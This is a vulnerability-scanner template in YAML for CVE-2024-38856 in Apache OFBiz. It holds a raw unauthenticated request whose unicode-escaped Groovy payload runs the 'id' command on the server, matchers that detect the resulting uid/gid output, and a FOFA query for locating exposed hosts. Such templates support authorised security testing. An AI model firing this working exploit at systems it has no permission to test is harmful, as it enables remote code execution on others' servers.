http:
- matchers:
  - part: body
    regex:
    - uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)
    type: regex
  - part: body
    type: word
    words:
    - java.lang.Exception
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /webtools/control/main/ProgramExport HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b

    '
id: CVE-2024-38856
info:
  author: Co5mos
  classification:
    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
    epss-percentile: 0.16306
    epss-score: 0.00045
  description: 'Incorrect Authorization vulnerability in Apache OFBiz. This issue
    affects Apache OFBiz: through 18.12.14. Users are recommended to upgrade to version
    18.12.15, which fixes the issue. Unauthenticated endpoints could allow execution
    of screen rendering code of screens if some preconditions are met (such as when
    the screen definitions don''t explicitly check user''s permissions because they
    rely on the configuration of their endpoints).

    '
  metadata:
    fofa-query: app="Apache_OFBiz"
    max-request: 1
    product: ofbiz
    vendor: apache
    verified: true
  name: Apache OFBiz - Remote Code Execution
  reference:
  - https://unam4.github.io/2024/08/05/CVE-2024-38856-ofbiz-12-14-filter%E7%BB%95%E8%BF%87%E5%88%B0rce/
  - https://issues.apache.org/jira/browse/OFBIZ-13128
  - https://lists.apache.org/thread/olxxjk6b13sl3wh9cmp0k2dscvp24l7w
  - https://ofbiz.apache.org/download.html
  - https://ofbiz.apache.org/security.html
  severity: critical
  tags: cve,cve2024,ofbiz,apache,rce,kev
